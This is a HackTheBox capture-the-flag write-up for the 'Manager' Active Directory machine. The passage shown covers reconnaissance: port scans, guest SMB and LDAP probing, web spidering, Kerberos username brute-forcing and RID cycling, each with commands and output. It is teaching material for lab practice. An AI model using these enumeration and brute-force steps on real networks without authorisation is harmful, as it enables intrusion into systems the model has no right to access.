# CTF Penetration Testing

## Platform: HackTheBox

### Machine: [Manager](https://www.hackthebox.com/machines/Manager)

<img src="https://labs.hackthebox.com/storage/avatars/5ca8f0c721a9eca6f1aeb9ff4b4bac60.png" alt="Manager Machine Logo" width="150"/>

- Machine type: <img src="https://hackmyvm.eu/img/windows.png" alt="Windows" width="17"/> Windows
- Machine difficulty: 🟨 Medium

> Manager is a medium difficulty Windows machine which hosts an Active Directory environment with AD CS (Active Directory Certificate Services), a web server, and an SQL server. The foothold involves enumerating users using RID cycling and performing a password spray attack to gain access to the MSSQL service. The `xp_dirtree` procedure is then used to explore the filesystem, uncovering a website backup in the web-root. Extracting the backup reveals credentials that are reused to WinRM to the server. Finally, the attacker escalates privileges through AD CS via ESC7 exploitation.

#### Skills Required

- Windows Fundamentals
- SMB Enumeration

#### Skills learned

- AD CS enumeration
- [ESC7 exploitation](https://www.tarlogic.com/blog/ad-cs-esc7-attack/)

#### Tools Used

- Certify.exe
- certipy-ad
- crackmapexec
- evil-winrm
- gobuster
- impacket-mssqlclient
- impacket-psexec
- kerbrute
- ldapsearch
- nmap
- openssl
- zaproxy

#### Machine Writeup

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`ifconfig tun0`:
```
tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.10.14.22  netmask 255.255.254.0  destination 10.10.14.22 ←
        inet6 fe80::df38:891f:ff61:26a  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef:2::1014  prefixlen 64  scopeid 0x0<global>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
        RX packets 1875  bytes 1044651 (1020.1 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2096  bytes 941051 (918.9 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```

`fping 10.10.11.236`:
```
10.10.11.236 is alive ←
```

`nmap -Pn -sSV -p- -T5 10.10.11.236`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-05 18:20 CET
Warning: 10.10.11.236 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.11.236
Host is up (0.070s latency).
Not shown: 65512 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0 ←
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-06 00:22:39Z) ←
135/tcp   open  msrpc         Microsoft Windows RPC ←
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn ←
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name) ←
445/tcp   open  microsoft-ds? ←
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name) ←
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000 ←
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name) ←
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name) ←
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) ←
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49722/tcp open  msrpc         Microsoft Windows RPC
49793/tcp open  msrpc         Microsoft Windows RPC
50519/tcp open  tcpwrapped
50547/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows ←

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 209.28 seconds
```

`crackmapexec smb 10.10.11.236`:
```
SMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False) ←
```

`crackmapexec smb 10.10.11.236 -u '' -p ''`:
```
SMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [+] manager.htb\: ←
```

`crackmapexec smb 10.10.11.236 -u '' -p '' --shares`:
```
SMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [+] manager.htb\: 
SMB         10.10.11.236    445    DC01             [-] Error enumerating shares: STATUS_ACCESS_DENIED ←
```
❌

`crackmapexec smb 10.10.11.236 -u 'guest' -p ''`:
```
SMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [+] manager.htb\guest: ←
```

`crackmapexec smb 10.10.11.236 -u 'guest' -p '' --shares`:
```
SMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [+] manager.htb\guest: 
SMB         10.10.11.236    445    DC01             [*] Enumerated shares
SMB         10.10.11.236    445    DC01             Share           Permissions     Remark
SMB         10.10.11.236    445    DC01             -----           -----------     ------
SMB         10.10.11.236    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.236    445    DC01             C$                              Default share
SMB         10.10.11.236    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.236    445    DC01             NETLOGON                        Logon server share 
SMB         10.10.11.236    445    DC01             SYSVOL                          Logon server share
```

`crackmapexec smb 10.10.11.236 -u 'guest' -p '' --users`:
```
SMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [+] manager.htb\guest: 
SMB         10.10.11.236    445    DC01             [*] Trying to dump local users with SAMRPC protocol
```
❌

`nmap -Pn -sS --script=ldap-rootdse -p389 10.10.11.236`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-05 18:23 CET
Nmap scan report for 10.10.11.236
Host is up (0.069s latency).

PORT    STATE SERVICE
389/tcp open  ldap
| ldap-rootdse: 
| LDAP Results
|   <ROOT>
|       domainFunctionality: 7 ←
|       forestFunctionality: 7 ←
|       domainControllerFunctionality: 7 ←
|       rootDomainNamingContext: DC=manager,DC=htb ←
|       ldapServiceName: manager.htb:dc01$@MANAGER.HTB
|       isGlobalCatalogReady: TRUE
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: EXTERNAL
|       supportedSASLMechanisms: DIGEST-MD5
|       supportedLDAPVersion: 3
|       supportedLDAPVersion: 2
|       supportedLDAPPolicies: MaxPoolThreads
|       supportedLDAPPolicies: MaxPercentDirSyncRequests
|       supportedLDAPPolicies: MaxDatagramRecv
|       supportedLDAPPolicies: MaxReceiveBuffer
|       supportedLDAPPolicies: InitRecvTimeout
|       supportedLDAPPolicies: MaxConnections
|       supportedLDAPPolicies: MaxConnIdleTime
|       supportedLDAPPolicies: MaxPageSize
|       supportedLDAPPolicies: MaxBatchReturnMessages
|       supportedLDAPPolicies: MaxQueryDuration
|       supportedLDAPPolicies: MaxDirSyncDuration
|       supportedLDAPPolicies: MaxTempTableSize
|       supportedLDAPPolicies: MaxResultSetSize
|       supportedLDAPPolicies: MinResultSets
|       supportedLDAPPolicies: MaxResultSetsPerConn
|       supportedLDAPPolicies: MaxNotificationPerConn
|       supportedLDAPPolicies: MaxValRange
|       supportedLDAPPolicies: MaxValRangeTransitive
|       supportedLDAPPolicies: ThreadMemoryLimit
|       supportedLDAPPolicies: SystemMemoryLimitPercent
|       supportedControl: 1.2.840.113556.1.4.319
|       supportedControl: 1.2.840.113556.1.4.801
|       supportedControl: 1.2.840.113556.1.4.473
|       supportedControl: 1.2.840.113556.1.4.528
|       supportedControl: 1.2.840.113556.1.4.417
|       supportedControl: 1.2.840.113556.1.4.619
|       supportedControl: 1.2.840.113556.1.4.841
|       supportedControl: 1.2.840.113556.1.4.529
|       supportedControl: 1.2.840.113556.1.4.805
|       supportedControl: 1.2.840.113556.1.4.521
|       supportedControl: 1.2.840.113556.1.4.970
|       supportedControl: 1.2.840.113556.1.4.1338
|       supportedControl: 1.2.840.113556.1.4.474
|       supportedControl: 1.2.840.113556.1.4.1339
|       supportedControl: 1.2.840.113556.1.4.1340
|       supportedControl: 1.2.840.113556.1.4.1413
|       supportedControl: 2.16.840.1.113730.3.4.9
|       supportedControl: 2.16.840.1.113730.3.4.10
|       supportedControl: 1.2.840.113556.1.4.1504
|       supportedControl: 1.2.840.113556.1.4.1852
|       supportedControl: 1.2.840.113556.1.4.802
|       supportedControl: 1.2.840.113556.1.4.1907
|       supportedControl: 1.2.840.113556.1.4.1948
|       supportedControl: 1.2.840.113556.1.4.1974
|       supportedControl: 1.2.840.113556.1.4.1341
|       supportedControl: 1.2.840.113556.1.4.2026
|       supportedControl: 1.2.840.113556.1.4.2064
|       supportedControl: 1.2.840.113556.1.4.2065
|       supportedControl: 1.2.840.113556.1.4.2066
|       supportedControl: 1.2.840.113556.1.4.2090
|       supportedControl: 1.2.840.113556.1.4.2205
|       supportedControl: 1.2.840.113556.1.4.2204
|       supportedControl: 1.2.840.113556.1.4.2206
|       supportedControl: 1.2.840.113556.1.4.2211
|       supportedControl: 1.2.840.113556.1.4.2239
|       supportedControl: 1.2.840.113556.1.4.2255
|       supportedControl: 1.2.840.113556.1.4.2256
|       supportedControl: 1.2.840.113556.1.4.2309
|       supportedControl: 1.2.840.113556.1.4.2330
|       supportedControl: 1.2.840.113556.1.4.2354
|       supportedCapabilities: 1.2.840.113556.1.4.800
|       supportedCapabilities: 1.2.840.113556.1.4.1670
|       supportedCapabilities: 1.2.840.113556.1.4.1791
|       supportedCapabilities: 1.2.840.113556.1.4.1935
|       supportedCapabilities: 1.2.840.113556.1.4.2080
|       supportedCapabilities: 1.2.840.113556.1.4.2237
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=manager,DC=htb
|       serverName: CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=manager,DC=htb
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=manager,DC=htb
|       namingContexts: DC=manager,DC=htb
|       namingContexts: CN=Configuration,DC=manager,DC=htb
|       namingContexts: CN=Schema,CN=Configuration,DC=manager,DC=htb
|       namingContexts: DC=DomainDnsZones,DC=manager,DC=htb
|       namingContexts: DC=ForestDnsZones,DC=manager,DC=htb
|       isSynchronized: TRUE
|       highestCommittedUSN: 176608
|       dsServiceName: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=manager,DC=htb
|       dnsHostName: dc01.manager.htb ←
|       defaultNamingContext: DC=manager,DC=htb
|       currentTime: 20241106002336.0Z
|_      configurationNamingContext: CN=Configuration,DC=manager,DC=htb
Service Info: Host: DC01; OS: Windows

Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
```

`echo -e '10.10.11.236\tdc01.manager.htb manager.htb manager' | tee -a /etc/hosts`:
```
10.10.11.236    dc01.manager.htb manager.htb manager ←
```

`ldapsearch -x -H ldap://10.10.11.236/ -s 'base' 'namingContexts'`:
```
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingContexts 
#

#
dn:
namingContexts: DC=manager,DC=htb
namingContexts: CN=Configuration,DC=manager,DC=htb
namingContexts: CN=Schema,CN=Configuration,DC=manager,DC=htb
namingContexts: DC=DomainDnsZones,DC=manager,DC=htb
namingContexts: DC=ForestDnsZones,DC=manager,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

`ldapsearch -x -H ldap://10.10.11.236/ -b "DC=manager,DC=htb" '(objectClass=*)'`:
```
# extended LDIF
#
# LDAPv3
# base <DC=manager,DC=htb> with scope subtree
# filter: (objectClass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090CF4, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1
```
❌

`ldapsearch -x -H ldap://10.10.11.236/ -D 'manager.htb\' -w '' -b "DC=manager,DC=htb" '(objectClass=*)'`:
```
# extended LDIF
#
# LDAPv3
# base <DC=manager,DC=htb> with scope subtree
# filter: (objectClass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090CF4, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1
```
❌

`ldapsearch -x -H ldap://10.10.11.236/ -D 'manager.htb\guest' -w '' -b "DC=manager,DC=htb" '(objectClass=*)'`:
```
# extended LDIF
#
# LDAPv3
# base <DC=manager,DC=htb> with scope subtree
# filter: (objectClass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090CF4, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1
```
❌

`nmap -sSV --script ssl-cert -p636,3269 10.10.11.236`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-05 18:30 CET
Nmap scan report for dc01.manager.htb (10.10.11.236)
Host is up (0.060s latency).

PORT     STATE SERVICE  VERSION
636/tcp  open  ssl/ldap Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Issuer: commonName=manager-DC01-CA ←
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-30T17:08:51
| Not valid after:  2122-07-27T10:31:04
| MD5:   bc56:af22:5a3d:db67:c9bb:a439:4232:14d1
|_SHA-1: 2b6d:98b3:d379:df64:59f6:c665:d4b7:53b0:faf6:e07a
3269/tcp open  ssl/ldap Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb ←
| Issuer: commonName=manager-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-30T17:08:51
| Not valid after:  2122-07-27T10:31:04
| MD5:   bc56:af22:5a3d:db67:c9bb:a439:4232:14d1
|_SHA-1: 2b6d:98b3:d379:df64:59f6:c665:d4b7:53b0:faf6:e07a
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.67 seconds
```

`openssl s_client -showcerts -connect 10.10.11.236:3269 | openssl x509 -noout -text`:
```
Connecting to 10.10.11.236
Can't use SSL_get_servername
depth=0 
verify error:num=20:unable to get local issuer certificate
verify return:1
depth=0 
verify error:num=21:unable to verify the first certificate
verify return:1
depth=0 
verify return:1
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            5f:00:00:00:11:c3:94:80:2e:94:f5:87:c6:00:00:00:00:00:11
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: DC=htb, DC=manager, CN=manager-DC01-CA ←
        Validity
            Not Before: Aug 30 17:08:51 2024 GMT
            Not After : Jul 27 10:31:04 2122 GMT
        Subject: 
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
                Modulus:
                    00:ec:fb:79:8c:08:03:88:b9:e5:5d:b0:9a:12:ee:
                    58:91:85:3d:50:1e:4e:df:a4:e7:4a:a9:0c:0f:1e:
                    7f:89:79:f1:56:6c:b2:9f:10:9e:cc:0d:b4:4b:9c:
                    24:67:ed:51:66:ae:06:37:f2:90:f0:83:99:39:b4:
                    59:ea:e1:5c:df:82:a1:39:a8:ce:6d:1d:76:3b:89:
                    bb:77:16:4b:28:b4:30:ca:fe:04:4f:6d:73:95:b1:
                    ee:c3:37:2c:78:c7:8f:b7:cb:e6:d1:e6:9b:7b:33:
                    a5:47:41:96:df:23:12:10:49:66:83:74:6d:8a:f7:
                    79:6b:e9:3a:c8:87:c0:d7:3d:3f:f7:12:1a:42:5e:
                    b5:c9:87:b1:c0:04:b9:df:e2:33:f0:86:8f:5c:f5:
                    a4:1e:bf:44:2f:10:1d:48:c6:09:10:b8:95:f1:e1:
                    b8:dc:a3:90:db:ca:ea:04:d7:9c:cf:97:87:62:7b:
                    f2:d0:02:92:d4:ab:7b:20:e0:ce:1c:ac:07:15:87:
                    c8:ac:a7:25:dd:82:03:13:e2:2a:48:2b:fe:81:d2:
                    a9:ad:fb:df:82:ca:45:ac:98:1b:0d:81:21:0c:ff:
                    77:90:71:74:e9:b6:e7:b6:d0:4a:bc:2a:6e:f8:50:
                    02:ae:0d:80:23:2c:a6:56:17:89:c7:c9:49:ce:03:
                    1e:79
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            Microsoft certificate template: 
                0&..+.....7.........W...&..y...#....n...
            X509v3 Extended Key Usage: 
                TLS Web Client Authentication, TLS Web Server Authentication, Microsoft Smartcard Login
            X509v3 Key Usage: critical
                Digital Signature, Key Encipherment
            Microsoft Application Policies Extension: 
                0&0
..+.......0
..+.......0..
+.....7...
            X509v3 Subject Key Identifier: 
                F0:66:54:1B:8B:14:4E:C8:70:BA:BE:8B:31:2F:46:6A:64:5C:74:13
            X509v3 Authority Key Identifier: 
                3A:CB:F4:2E:CD:89:C8:24:36:66:8F:39:58:06:0E:22:BF:30:0E:4C
            X509v3 CRL Distribution Points: 
                Full Name:
                  URI:ldap:///CN=manager-DC01-CA,CN=dc01,CN=CDP,CN=Public%20Key%20Services,CN=Services,CN=Configuration,DC=manager,DC=htb?certificateRevocationList?base?objectClass=cRLDistributionPoint
            Authority Information Access: 
                CA Issuers - URI:ldap:///CN=manager-DC01-CA,CN=AIA,CN=Public%20Key%20Services,CN=Services,CN=Configuration,DC=manager,DC=htb?cACertificate?base?objectClass=certificationAuthority
            X509v3 Subject Alternative Name: critical
                DNS:dc01.manager.htb
            Microsoft NTDS CA Extension: 
                0@.>.
+.....7....0..S-1-5-21-4078382237-1492182817-2568127209-1000
    Signature Algorithm: sha256WithRSAEncryption
    Signature Value:
        10:1d:38:83:1c:aa:c0:ce:7d:9f:f4:47:6a:79:d0:1c:d7:c9:
        ab:ce:32:c0:35:5c:11:9c:df:53:4e:29:a2:20:f7:af:c9:c5:
        6f:d8:41:6c:94:4a:fa:80:70:b5:92:7a:0a:97:b3:31:72:9e:
        06:a8:ea:9a:87:e4:18:aa:97:d8:d9:84:3d:97:f1:a6:89:ce:
        68:95:64:ed:93:b5:24:f8:f5:ab:a0:7e:e9:b9:85:06:22:08:
        8a:3f:8c:08:4a:0b:ab:e7:36:5f:a9:02:34:59:60:47:ef:f8:
        f6:6a:8e:c7:c3:54:1c:02:5d:14:09:12:98:88:02:67:74:e5:
        bf:f3:ae:1c:fb:55:27:1e:19:61:80:5a:f2:62:7a:fc:a7:8f:
        1d:09:0a:97:be:eb:5f:ec:f3:0d:a1:00:bb:dc:74:f7:13:46:
        d0:94:a1:57:c5:4f:16:b7:cf:10:51:9a:7a:ad:da:5f:ea:01:
        d5:0f:d1:09:4d:27:5d:80:d1:ec:6d:52:0d:4b:ec:52:29:1f:
        4b:81:76:a8:57:1a:3a:b3:3c:3e:63:2c:21:b8:08:8b:82:e0:
        33:5a:8b:ef:26:57:24:18:6b:a2:87:8e:87:7d:40:e1:8e:51:
        27:83:55:d7:ac:85:fe:65:7b:6f:2c:75:d4:8f:89:98:66:bc:
        d4:59:17:51

read:errno=104
```

`zaproxy`

`Sites: http://10.10.11.236` > `<right-click>` > `Attack` > `Spider...` > `Starting Point: http://10.10.11.236`, `Recurse: enabled` > `Start Scan` > `Export` > `./spider.csv`

`cat ./spider.csv`:
```
Processed,Method,URI,Flags
true,GET,http://10.10.11.236,Seed
true,GET,http://10.10.11.236/robots.txt,Seed
true,GET,http://10.10.11.236/sitemap.xml,Seed
true,GET,http://10.10.11.236/about.html,Seed
true,GET,http://10.10.11.236/contact.html,Seed
true,GET,http://10.10.11.236/images,Seed

[...]

true,GET,http://10.10.11.236/images/,
false,GET,https://getbootstrap.com/,Out of Scope
false,GET,http://www.w3.org/2000/svg,Out of Scope
```

`cat ./spider.csv | grep "true" | awk -F ',' '{ print $3 }' | sort -u`:
```
http://10.10.11.236
http://10.10.11.236/about.html
http://10.10.11.236/contact.html
http://10.10.11.236/images/

[...]

http://10.10.11.236/robots.txt
http://10.10.11.236/service.html
http://10.10.11.236/sitemap.xml
```
❌

`zaproxy`

`Sites: http://10.10.11.236` > `<right-click>` > `Attack` > `Active Scan...` > `Starting Point: http://10.10.11.236`, `Recurse: enabled` > `Start Scan` > `Export` > `./activescan.csv`

`cat ./activescan.csv | grep -v -E '400|401|404|500' | awk -F ',' '{ print $5 }' | sort -u`:
```
http://10.10.11.236
http://10.10.11.236/
http://10.10.11.236/about.html
http://10.10.11.236/about.html?class.module.classLoader.DefaultAssertionStatus=nonsense
http://10.10.11.236/about.html?name=abc
http://10.10.11.236/?class.module.classLoader.DefaultAssertionStatus=nonsense
http://10.10.11.236/contact.html
http://10.10.11.236/contact.html?class.module.classLoader.DefaultAssertionStatus=nonsense
http://10.10.11.236/contact.html?name=abc

[...]
```
❌

`gobuster dir -u http://10.10.11.236 -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -b 400,401,404,500 -x html,php,bak,jpg,txt,zip -t 15`:
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.236
[+] Method:                  GET
[+] Threads:                 15
[+] Wordlist:                /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404,500,400,401
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,bak,jpg,txt,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 150] [--> http://10.10.11.236/images/]
/index.html           (Status: 200) [Size: 18203]
/contact.html         (Status: 200) [Size: 5317]
/about.html           (Status: 200) [Size: 5386]
/service.html         (Status: 200) [Size: 7900]
/css                  (Status: 301) [Size: 147] [--> http://10.10.11.236/css/]
/js                   (Status: 301) [Size: 146] [--> http://10.10.11.236/js/]

[...]
```
❌

`cat /usr/share/wordlists/seclists/SecLists-master/Usernames/xato-net-10-million-usernames.txt | awk '{ print tolower($0) }' | uniq > ./xato_usernames_lowercase.txt`

`kerbrute userenum --dc 10.10.11.236 -d 'manager.htb' ./xato_usernames_lowercase.txt`:
```
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 11/05/24 - Ronnie Flathers @ropnop

2024/11/05 19:16:06 >  Using KDC(s):
2024/11/05 19:16:06 >   10.10.11.236:88

2024/11/05 20:18:00 >  [+] VALID USERNAME:       ryan@manager.htb
2024/11/05 20:18:02 >  [+] VALID USERNAME:       guest@manager.htb
2024/11/05 20:18:03 >  [+] VALID USERNAME:       cheng@manager.htb
2024/11/05 20:18:04 >  [+] VALID USERNAME:       raven@manager.htb
2024/11/05 20:18:10 >  [+] VALID USERNAME:       administrator@manager.htb
2024/11/05 20:18:31 >  [+] VALID USERNAME:       operator@manager.htb
2024/11/05 20:22:31 >  [+] VALID USERNAME:       jinwoo@manager.htb

[...]
```

<🔄 Alternative Step>

`rpcclient 10.10.11.236 -U 'guest' --no-pass`:
```
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
```
❌

`rpcclient 10.10.11.236 -U 'guest%'`:
```
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient $> lookupdomain manager.htb
result was NT_STATUS_ACCESS_DENIED
rpcclient $> lookupnames Administrator
Administrator S-1-5-21-4078382237-1492182817-2568127209-500 (User: 1)
```
```
rpcclient $> lookupsids S-1-5-21-4078382237-1492182817-2568127209-500
S-1-5-21-4078382237-1492182817-2568127209-500 MANAGER\Administrator (1) ←
rpcclient $> lookupsids S-1-5-21-4078382237-1492182817-2568127209-501
S-1-5-21-4078382237-1492182817-2568127209-501 MANAGER\Guest (1) ←
rpcclient $> lookupsids S-1-5-21-4078382237-1492182817-2568127209-502
S-1-5-21-4078382237-1492182817-2568127209-502 MANAGER\krbtgt (1) ←
rpcclient $> lookupsids S-1-5-21-4078382237-1492182817-2568127209-503
S-1-5-21-4078382237-1492182817-2568127209-503 *unknown*\*unknown* (8)

[...]

rpcclient $> lookupsids S-1-5-21-4078382237-1492182817-2568127209-1000
S-1-5-21-4078382237-1492182817-2568127209-1000 MANAGER\DC01$ (1) ←
rpcclient $> lookupsids S-1-5-21-4078382237-1492182817-2568127209-1001
S-1-5-21-4078382237-1492182817-2568127209-1001 *unknown*\*unknown* (8)

[...]

rpcclient $> lookupsids S-1-5-21-4078382237-1492182817-2568127209-1113
S-1-5-21-4078382237-1492182817-2568127209-1113 MANAGER\Zhong (1) ←
rpcclient $> lookupsids S-1-5-21-4078382237-1492182817-2568127209-1114
S-1-5-21-4078382237-1492182817-2568127209-1114 MANAGER\Cheng (1) ←
rpcclient $> lookupsids S-1-5-21-4078382237-1492182817-2568127209-1115
S-1-5-21-4078382237-1492182817-2568127209-1115 MANAGER\Ryan (1) ←
rpcclient $> lookupsids S-1-5-21-4078382237-1492182817-2568127209-1116
S-1-5-21-4078382237-1492182817-2568127209-1116 MANAGER\Raven (1) ←
rpcclient $> lookupsids S-1-5-21-4078382237-1492182817-2568127209-1117
S-1-5-21-4078382237-1492182817-2568127209-1117 MANAGER\JinWoo (1) ←
rpcclient $> lookupsids S-1-5-21-4078382237-1492182817-2568127209-1118
S-1-5-21-4078382237-1492182817-2568127209-1118 MANAGER\ChinHae (1) ←
rpcclient $> lookupsids S-1-5-21-4078382237-1492182817-2568127209-1119
S-1-5-21-4078382237-1492182817-2568127209-1119 MANAGER\Operator (1) ←
rpcclient $> lookupsids S-1-5-21-4078382237-1492182817-2568127209-1120
S-1-5-21-4078382237-1492182817-2568127209-1120 *unknown*\*unknown* (8)

[...]
```
```
rpcclient $> lookupsids S-1-5-21-4078382237-1492182817-2568127209-512
S-1-5-21-4078382237-1492182817-2568127209-512 MANAGER\Domain Admins (2)
rpcclient $> lookupsids S-1-5-21-4078382237-1492182817-2568127209-513
S-1-5-21-4078382237-1492182817-2568127209-513 MANAGER\Domain Users (2)
rpcclient $> lookupsids S-1-5-21-4078382237-1492182817-2568127209-514
S-1-5-21-4078382237-1492182817-2568127209-514 MANAGER\Domain Guests (2)
rpcclient $> lookupsids S-1-5-21-4078382237-1492182817-2568127209-515
S-1-5-21-4078382237-1492182817-2568127209-515 MANAGER\Domain Computers (2)
rpcclient $> lookupsids S-1-5-21-4078382237-1492182817-2568127209-516
S-1-5-21-4078382237-1492182817-2568127209-516 MANAGER\Domain Controllers (2)
rpcclient $> lookupsids S-1-5-21-4078382237-1492182817-2568127209-517
S-1-5-21-4078382237-1492182817-2568127209-517 MANAGER\Cert Publishers (4)
rpcclient $> lookupsids S-1-5-21-4078382237-1492182817-2568127209-518
S-1-5-21-4078382237-1492182817-2568127209-518 MANAGER\Schema Admins (2)
rpcclient $> lookupsids S-1-5-21-4078382237-1492182817-2568127209-519
S-1-5-21-4078382237-1492182817-2568127209-519 MANAGER\Enterprise Admins (2)
rpcclient $> lookupsids S-1-5-21-4078382237-1492182817-2568127209-520
S-1-5-21-4078382237-1492182817-2568127209-520 MANAGER\Group Policy Creator Owners (2)
rpcclient $> lookupsids S-1-5-21-4078382237-1492182817-2568127209-521
S-1-5-21-4078382237-1492182817-2568127209-521 MANAGER\Read-only Domain Controllers (2)
rpcclient $> lookupsids S-1-5-21-4078382237-1492182817-2568127209-522
S-1-5-21-4078382237-1492182817-2568127209-522 MANAGER\Cloneable Domain Controllers (2)
rpcclient $> lookupsids S-1-5-21-4078382237-1492182817-2568127209-523
S-1-5-21-4078382237-1492182817-2568127209-523 *unknown*\*unknown* (8)
```

</🔄 Alternative Step>

`crackmapexec smb 10.10.11.236 -u 'guest' -p '' --rid-brute`:
```
SMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [+] manager.htb\guest: 
SMB         10.10.11.236    445    DC01             498: MANAGER\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.236    445    DC01             500: MANAGER\Administrator (SidTypeUser)
SMB         10.10.11.236    445    DC01             501: MANAGER\Guest (SidTypeUser)
SMB         10.10.11.236    445    DC01             502: MANAGER\krbtgt (SidTypeUser)
SMB         10.10.11.236    445    DC01             512: MANAGER\Domain Admins (SidTypeGroup)
SMB         10.10.11.236    445    DC01             513: MANAGER\Domain Users (SidTypeGroup)
